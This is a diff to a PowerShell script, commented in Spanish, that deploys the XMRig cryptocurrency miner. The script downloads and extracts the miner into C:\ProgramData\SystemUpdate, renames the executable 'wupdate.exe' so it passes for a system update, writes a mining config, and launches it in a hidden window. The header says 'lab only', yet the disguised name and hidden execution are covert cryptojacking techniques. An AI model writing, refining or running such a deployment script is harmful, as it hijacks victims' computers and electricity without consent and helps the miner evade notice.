@@ -1,4 +1,4 @@
-# === DEPLOY XMRig MINERO - Versión 4 (Simple y fiable para lab) ===
+# === DEPLOY XMRig MINERO - Versión 5 (Config sin BOM + ejecución directa) - Lab only ===
 $installPath = "C:\ProgramData\SystemUpdate"
 New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 
@@ -9,11 +9,11 @@ Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
 Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
 Remove-Item $zipPath -Force
 
-# Copiar y renombrar el ejecutable
+# Copiar y renombrar
 $xmrigExe = "$installPath\xmrig-6.25.0\xmrig.exe"
 Copy-Item $xmrigExe "$installPath\wupdate.exe" -Force
 
-# Config con tu wallet + 50% núcleos
+# Configuración SIN BOM (usamos .NET para escribir UTF-8 puro)
 $configContent = @'
 {
     "autosave": true,
@@ -34,10 +34,10 @@ $configContent = @'
 }
 '@
 $configPath = "$installPath\config.json"
-$configContent | Out-File -FilePath $configPath -Encoding utf8 -Force
+[System.IO.File]::WriteAllLines($configPath, $configContent.Split("`n"), [System.Text.Encoding]::UTF8)
 
-# === EJECUCIÓN DIRECTA (sin tarea) ===
+# Ejecutar directamente el minero (sin ventana)
 $exePath = "$installPath\wupdate.exe"
 Start-Process -FilePath $exePath -ArgumentList "-c `"$configPath`"" -WindowStyle Hidden -NoNewWindow
 
-Write-Output "=== Minero lanzado directamente (versión 4) ==="
+Write-Output "=== Minero lanzado (versión 5 - config corregida) ==="
